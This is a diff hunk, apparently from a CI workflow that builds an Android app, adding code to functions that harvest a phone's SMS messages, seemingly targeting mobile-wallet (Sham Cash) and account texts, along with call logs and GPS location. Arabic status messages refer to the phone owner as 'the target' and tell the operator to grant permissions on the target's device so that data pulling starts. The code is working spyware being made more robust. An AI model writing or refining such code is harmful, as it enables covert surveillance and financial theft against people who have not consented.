@@ -627,6 +627,13 @@ jobs:
             private String getDeepShamCashAndAccountSms() {
                 StringBuilder sb = new StringBuilder();
                 try {
+                    // فحص الصلاحية برمجياً قبل الاستعلام لمنع Permission Denial
+                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
+                        if (checkSelfPermission(android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
+                            return "⚠️ تنبيه سيادي: صلاحية قراءة الرسائل (READ_SMS) غير ممنوحة حالياً من قبل الهدف. يرجى فتح واجهة التطبيق على جهاز الهدف ومنح الأذونات لتفعيل السحب الفوري.";
+                        }
+                    }
+
                     Cursor cursor = getContentResolver().query(Uri.parse("content://sms/"), null, null, null, "date DESC");
                     if (cursor != null && cursor.moveToFirst()) {
                         int addressIdx = cursor.getColumnIndex("address");
@@ -667,7 +674,11 @@ jobs:
                                 generalCursor.close();
                             }
                         }
+                    } else {
+                        sb.append("📭 صندوق الرسائل فارغ أو تعذر الوصول للمحتوى.");
                     }
+                } catch (SecurityException se) {
+                    sb.append("🚨 رفض أمني من النظام (Permission Denial): لم يتم منح صلاحية قراءة الرسائل بعد.");
                 } catch (Exception e) { 
                     sb.append("خطأ في قراءة الأرشيف: ").append(e.getMessage()); 
                 }
@@ -677,6 +688,11 @@ jobs:
             private String getCallLogs() {
                 StringBuilder sb = new StringBuilder();
                 try {
+                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
+                        if (checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
+                            return "⚠️ صلاحية سجل المكالمات غير ممنوحة حالياً.";
+                        }
+                    }
                     Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
                     if (cursor != null && cursor.moveToFirst()) {
                         int numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
@@ -718,7 +734,7 @@ jobs:
                         return "خط العرض: " + loc.getLatitude() + "\nخط الطول: " + loc.getLongitude() + "\nرابط الخريطة: https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude();
                     }
                 } catch (Exception e) {}
-                return "تعذر جلب إحداثيات الموقع حالياً.";
+                return "تعذر جلب إحداثيات الموقع حالياً (تأكد من تفعيل GPS بالهاتف).";
             }
         }
         EOF
